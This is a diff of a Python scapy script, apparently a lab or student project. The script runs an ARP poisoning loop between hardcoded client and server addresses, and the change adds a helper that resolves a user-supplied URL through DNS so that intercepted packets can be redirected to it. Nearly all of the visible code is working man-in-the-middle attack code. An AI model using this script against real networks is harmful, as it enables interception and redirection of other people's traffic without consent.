@@ -1,12 +1,14 @@
 from scapy.all import *
 from scapy.layers.inet import TCP, IP, ICMP, UDP
+from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.l2 import *
 import pcap
 import time
 
-local_ip = '10.0.0.14'
-client_ip = "10.0.0.12"
-server_ip = "10.0.0.138"
+local_ip = '10.10.10.125'
+client_ip = "10.10.10.201"
+server_ip = "10.10.10.2"
+custom_ip = ""
 
 
 def arp_poison():
@@ -19,6 +21,21 @@ def arp_poison():
     while True:
         sendp(pkt)
         time.sleep(5)
+
+
+def get_ip_from_url():
+    """sends a DNS request to the specified url. returns the matching ip got from the server"""
+    try:
+        print("custom ip setup")
+        custom_url = input("enter url to redirect packets to: ")
+        ip = sr1(
+            IP(dst="8.8.8.8") / UDP(sport=RandShort(), dport=53)
+            / DNS(rd=1, qd=DNSQR(qname=custom_url, qtype="A"))).an.rdata
+        print("----------------------------------------\n")
+    except AttributeError:
+        print("Invalid url. Try again.")
+        ip = get_ip_from_url()
+    return ip
 
 
 def main():
